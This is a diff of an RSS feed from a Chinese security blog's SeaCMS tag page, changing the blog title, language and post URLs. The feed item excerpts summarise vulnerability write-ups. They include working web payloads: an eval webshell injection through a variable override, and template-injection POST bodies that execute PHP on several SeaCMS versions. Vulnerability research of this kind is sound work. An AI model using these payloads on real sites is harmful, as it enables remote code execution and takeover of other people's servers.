@@ -1,28 +1,28 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>SeaCMS on F0rmat&#39;Blog</title>
+    <title>SeaCMS on F0rmat的博客 | 专注于网络攻防和信息安全</title>
     <link>https://getshe11.com/tags/seacms/</link>
-    <description>Recent content in SeaCMS on F0rmat&#39;Blog</description>
+    <description>Recent content in SeaCMS on F0rmat的博客 | 专注于网络攻防和信息安全</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
+    <language>zh-cn</language>
     <lastBuildDate>Tue, 22 Oct 2019 11:17:18 +0000</lastBuildDate><atom:link href="https://getshe11.com/tags/seacms/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Seacms9.92从变量覆盖到getshell</title>
-      <link>https://getshe11.com/posts/seacms9.92-from-variable-override-to-getshell/</link>
+      <link>https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/</link>
       <pubDate>Tue, 22 Oct 2019 11:17:18 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/seacms9.92-from-variable-override-to-getshell/</guid>
+      <guid>https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/</guid>
       <description>文章的markdown的版本弄丢了，之前在知乎写的还在
 https://zhuanlan.zhihu.com/p/86986342</description>
     </item>
     
     <item>
       <title>Seacms&lt;=9.92前台Getshell</title>
-      <link>https://getshe11.com/posts/seacms-front-desk-getshell/</link>
+      <link>https://getshe11.com/post/seacms-front-desk-getshell/</link>
       <pubDate>Fri, 27 Sep 2019 01:01:30 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/seacms-front-desk-getshell/</guid>
+      <guid>https://getshe11.com/post/seacms-front-desk-getshell/</guid>
       <description>0x01 前言 好久没发代码审计的文章了，最近挺多事情的，无意中看到90Sec上面有一篇seacms前台的getshell，突然就很感兴趣，之前审计这套程序的时候也审计了一下，后面太多事情就搁置了。
 0x02 漏洞复现 环境是phpstudy（最近出后门新闻最火的那个），用着也挺方便的。PHP版本是5.x的。 payload：
 http://127.0.0.1/comment/api/index.php?gid=1&amp;amp;page=2&amp;amp;rlist[]=*hex/@eval($_GET[_]);?%3E 然后访问：
@@ -35,10 +35,10 @@ http://127.0.0.1/data/mysqli_error_trace.php?_=phpinfo(); 0x03 漏洞分析 关�
     
     <item>
       <title>Seacms 8.7版本SQL注入分析</title>
-      <link>https://getshe11.com/posts/seacms8.7-sql-injection-analysis/</link>
+      <link>https://getshe11.com/post/seacms8.7-sql-injection-analysis/</link>
       <pubDate>Mon, 04 Mar 2019 15:49:11 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/seacms8.7-sql-injection-analysis/</guid>
+      <guid>https://getshe11.com/post/seacms8.7-sql-injection-analysis/</guid>
       <description>0x01 前言 好像没发文章了，在t00ls看到一篇seacms8.7的分析文，不过不是最新的版本，好久没看到seacms和maccms这两个cms发新的漏洞了，那个过滤有点恶心。后来还在nosec看到一篇离新版9.0比较近的一个版本8.9的一个变量覆盖到sql注入文章，但是我复现不成功，我拿的是6.53的版本，原因后面会讲到。
 0x02 环境 Web： phpstudy and MAMP System： Windows 7 X64 and MacOS Browser： Firefox Quantum and Chrome MySQL： 5.5 php： 5.4
 0x03 漏洞详情 漏洞复现 payload:
@@ -49,10 +49,10 @@ http://10.211.55.4/upload/comment/api/index.php?gid=1&amp;amp;page=2&amp;amp;rli
     
     <item>
       <title>SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞(每日一洞)</title>
-      <link>https://getshe11.com/posts/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</link>
+      <link>https://getshe11.com/post/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</link>
       <pubDate>Sat, 03 Mar 2018 23:32:41 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</guid>
+      <guid>https://getshe11.com/post/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</guid>
       <description>前言 这两个版本修复上次的v6.45版本中的order传值后执行的漏洞，但是在新的版本里面利用parseIf函数的功能还可以继续利用。 因为上一篇也已经过了一遍search.php的执行过程，这篇就不再重复讲解了。 链接：http://getpass.cn/2018/03/02/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E)/
 环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
 v6.54漏洞详情 漏洞代码执行 Payload get:http://seacms.test/search.php POST: searchtype=5&amp;amp;searchword={if{searchpage:year}&amp;amp;year=:e{searchpage:area}}&amp;amp;area=v{searchpage:letter}&amp;amp;letter=al{searchpage:lang}&amp;amp;yuyan=(join{searchpage:jq}&amp;amp;jq=($_P{searchpage:ver}&amp;amp;ver=OST[9]))&amp;amp;9[]=ph&amp;amp;9[]=pinfo();
@@ -61,10 +61,10 @@ v6.54漏洞详情 漏洞代码执行 Payload get:http://seacms.test/search.php P
     
     <item>
       <title>SeaCMS v6.45前台Getshell 代码执行漏洞(每日一洞)</title>
-      <link>https://getshe11.com/posts/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</link>
+      <link>https://getshe11.com/post/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</link>
       <pubDate>Fri, 02 Mar 2018 19:28:36 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</guid>
+      <guid>https://getshe11.com/post/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</guid>
       <description>前言 昨晚审计到了三点，今天还要整理宿舍就没有写文章。这个CMS没有用框架，漏洞的执行过程我看了很久才看完，下面就写漏洞执行过程和POC构造还有用Python编写批量Getshell脚本。
 环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
 漏洞代码执行过程分析 先看一下这个代码是一个怎么执行的吧，我画了一个流程图，有点简陋，不过如果真的要深入了解一定要亲自去看一遍代码才行。 漏洞详情 漏洞代码执行 Payload代码 http://seacms.test/search.php POST:searchtype=5&amp;amp;order=}{end if} {if:1)phpinfo();if(1}{end if}
